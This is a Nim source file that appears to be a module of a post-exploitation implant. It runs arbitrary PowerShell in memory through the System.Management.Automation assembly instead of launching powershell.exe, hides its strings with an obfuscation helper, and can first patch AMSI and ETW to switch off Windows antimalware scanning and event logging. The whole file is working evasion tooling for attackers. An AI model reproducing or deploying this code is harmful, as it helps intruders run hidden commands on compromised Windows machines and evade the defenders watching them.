import winim/clr except `[]`
from strutils import parseInt
import ../../util/patches

# Execute a PowerShell command via referencing the System.Management.Automation
# assembly DLL directly without calling powershell.exe
proc powershell*(args : varargs[string]) : string =
    # This shouldn't happen since parameters are managed on the Python-side, but you never know
    if not args.len >= 2:
        result = obf("Invalid number of arguments received. Usage: 'powershell <BYPASSAMSI=0> <BLOCKETW=0> [command]'.")
        return

    var
        amsi: bool = false
        etw: bool = false
        commandArgs = args[2 .. ^1].join(obf(" "))

    amsi = cast[bool](parseInt(args[0]))
    etw = cast[bool](parseInt(args[1]))

    result = obf("Executing command via unmanaged PowerShell...\n")
    if amsi:
        var res = patchAMSI()
        if res == 0:
            result.add(obf("[+] AMSI patched!\n"))
        if res == 1:
            result.add(obf("[-] Error patching AMSI!\n"))
        if res == 2:
            result.add(obf("[+] AMSI already patched!\n"))
    if etw:
        var res = patchETW()
        if res == 0:
            result.add(obf("[+] ETW patched!\n"))
        if res == 1:
            result.add(obf("[-] Error patching ETW!\n"))
        if res == 2:
            result.add(obf("[+] ETW already patched!\n"))
    
    let
        Automation = load(obf("System.Management.Automation"))
        RunspaceFactory = Automation.GetType(obf("System.Management.Automation.Runspaces.RunspaceFactory"))
    var
        runspace = @RunspaceFactory.CreateRunspace()
        pipeline = runspace.CreatePipeline()

    runspace.Open()
    pipeline.Commands.AddScript(commandArgs)
    pipeline.Commands.Add(obf("Out-String"))

    var pipeOut = pipeline.Invoke()
    for i in countUp(0, pipeOut.Count() - 1):
        result.add($pipeOut.Item(i))

    runspace.Dispose()